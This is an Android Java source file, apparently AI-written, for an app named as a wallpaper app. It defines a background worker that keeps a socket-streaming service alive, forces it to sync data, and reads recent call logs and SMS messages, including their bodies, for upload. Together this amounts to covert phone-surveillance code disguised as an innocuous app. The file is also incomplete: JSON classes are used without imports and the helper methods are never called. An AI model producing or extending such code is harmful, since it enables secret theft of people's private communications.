package com.example.wallpaperapplication;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.Telephony;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import androidx.preference.PreferenceManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

public class DataSyncWorker extends Worker {
    private static final String TAG = "DataSyncWorker";

    public DataSyncWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        Log.d(TAG, "Starting data sync work...");
        Context context = getApplicationContext();

        // 1. Ensure Service is Running (Boot Hardening)
        // If the service was killed, this worker will revive it to ensure the socket stays connected if possible.
        // We use checkSelfPermission inside startService safety, but here we just try to start it.
        try {
            SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
            if (prefs.getBoolean("streaming_enabled", false)) {
                Intent intent = new Intent(context, StreamingService.class);
                ContextCompat.startForegroundService(context, intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to restart service from worker", e);
        }

        // 2. Collect & Upload Data (HTTP Fallback)
        // Since we can't easily access the Service's Socket.IO instance, we upload via HTTP
        // or we can rely on the Service restart above to handle it.
        // The user asked to "Replace manual 30-second data polling".
        // So we will perform the collection here and upload.
        
        uploadData(context);

        return Result.success();
    }

    private void uploadData(Context context) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Permissions missing for data sync");
            return;
        }

        try {
            // Send explicit broadcast to the running StreamingService to trigger sync
            Intent intent = new Intent(Constants.ACTION_FORCE_SYNC);
            intent.setPackage(context.getPackageName());
            context.sendBroadcast(intent);
            
            Log.d(TAG, "Sent sync broadcast to Service");
            
        } catch (Exception e) {
            Log.e(TAG, "Data sync failed", e);
        }
    }

    private JSONArray getCallLogs(Context context) {
        JSONArray logs = new JSONArray();
        try {
            ContentResolver resolver = context.getContentResolver();
            Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 20) {
                     JSONObject call = new JSONObject();
                     call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                     call.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                     call.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                     logs.put(call);
                     count++;
                }
                cursor.close();
            }
        } catch (Exception e) { Log.e(TAG, "Error getting call logs", e); }
        return logs;
    }

    private JSONArray getSmsMessages(Context context) {
        JSONArray msgs = new JSONArray();
        try {
            ContentResolver resolver = context.getContentResolver();
            Cursor cursor = resolver.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 20) {
                     JSONObject sms = new JSONObject();
                     sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                     sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                     msgs.put(sms);
                     count++;
                }
                cursor.close();
            }
        } catch (Exception e) { Log.e(TAG, "Error getting SMS", e); }
        return msgs;
    }
}
